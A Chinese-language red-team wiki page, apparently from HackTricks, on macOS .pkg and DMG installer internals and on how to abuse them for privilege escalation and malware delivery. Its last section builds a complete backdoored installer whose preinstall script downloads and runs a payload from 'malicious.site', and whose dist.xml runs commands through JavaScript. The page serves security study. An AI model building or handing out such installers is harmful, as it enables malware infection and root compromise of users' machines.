# macOS 安装程序滥用

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 基本信息

macOS **安装包**（也称为 `.pkg` 文件）是一种由 macOS 用于 **分发软件** 的文件格式。这些文件就像一个 **包含软件所需的一切的盒子**，以便正确安装和运行。

包文件本身是一个存档，包含一个 **将在目标计算机上安装的文件和目录的层次结构**。它还可以包括 **脚本**，在安装前后执行任务，例如设置配置文件或清理旧版本的软件。

### 层次结构

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: 自定义（标题，欢迎文本……）和脚本/安装检查
- **PackageInfo (xml)**: 信息，安装要求，安装位置，运行脚本的路径
- **Bill of materials (bom)**: 要安装、更新或删除的文件列表及文件权限
- **Payload (CPIO archive gzip compresses)**: 从 PackageInfo 中在 `install-location` 安装的文件
- **Scripts (CPIO archive gzip compressed)**: 安装前和安装后的脚本以及提取到临时目录以供执行的更多资源。

### 解压缩
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
为了在不手动解压缩安装程序的情况下可视化其内容，您还可以使用免费的工具 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)。

## DMG 基本信息

DMG 文件，或称 Apple 磁盘映像，是苹果的 macOS 用于磁盘映像的文件格式。DMG 文件本质上是一个 **可挂载的磁盘映像**（它包含自己的文件系统），其中包含通常被压缩且有时被加密的原始块数据。当您打开 DMG 文件时，macOS **将其挂载为物理磁盘**，允许您访问其内容。

> [!CAUTION]
> 请注意，**`.dmg`** 安装程序支持 **如此多的格式**，以至于在过去，一些包含漏洞的格式被滥用以获得 **内核代码执行**。

### 层级结构

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 文件的层级结构可能会根据内容而有所不同。然而，对于应用程序 DMG，它通常遵循以下结构：

- 顶层：这是磁盘映像的根。它通常包含应用程序，并可能包含指向应用程序文件夹的链接。
- 应用程序 (.app)：这就是实际的应用程序。在 macOS 中，应用程序通常是一个包含许多单独文件和文件夹的包，这些文件和文件夹构成了该应用程序。
- 应用程序链接：这是指向 macOS 中应用程序文件夹的快捷方式。这样做的目的是方便您安装应用程序。您可以将 .app 文件拖到此快捷方式上以安装该应用程序。

## 通过 pkg 滥用提升权限

### 从公共目录执行

如果预安装或后安装脚本例如从 **`/var/tmp/Installerutil`** 执行，攻击者可以控制该脚本，从而在每次执行时提升权限。或者另一个类似的例子：

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

这是一个 [公共函数](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)，多个安装程序和更新程序将调用它以 **以 root 身份执行某些操作**。此函数接受要 **执行** 的 **文件** 的 **路径** 作为参数，然而，如果攻击者能够 **修改** 此文件，他将能够 **滥用** 其以 root 身份执行以 **提升权限**。
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
For more info check this talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### 执行通过挂载

如果安装程序写入 `/tmp/fixedname/bla/bla`，可以在 `/tmp/fixedname` 上 **创建一个挂载**，并且没有所有者，这样你就可以 **在安装过程中修改任何文件** 来滥用安装过程。

一个例子是 **CVE-2021-26089**，它成功地 **覆盖了一个定期脚本** 以获得 root 权限。有关更多信息，请查看这个演讲: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg 作为恶意软件

### 空载荷

可以仅生成一个 **`.pkg`** 文件，里面包含 **预安装和后安装脚本**，而没有任何真正的载荷，除了脚本中的恶意软件。

### 分发 xml 中的 JS

可以在包的 **分发 xml** 文件中添加 **`<script>`** 标签，这段代码将被执行，并且可以使用 **`system.run`** **执行命令**：

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

### 后门安装程序

恶意安装程序使用脚本和 dist.xml 中的 JS 代码
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## 参考文献

- [**DEF CON 27 - 解包 Pkgs 深入了解 Macos 安装包及常见安全漏洞**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "macOS 安装程序的奇妙世界" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - 解包 Pkgs 深入了解 MacOS 安装包**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)

{{#include ../../../banners/hacktricks-training.md}}
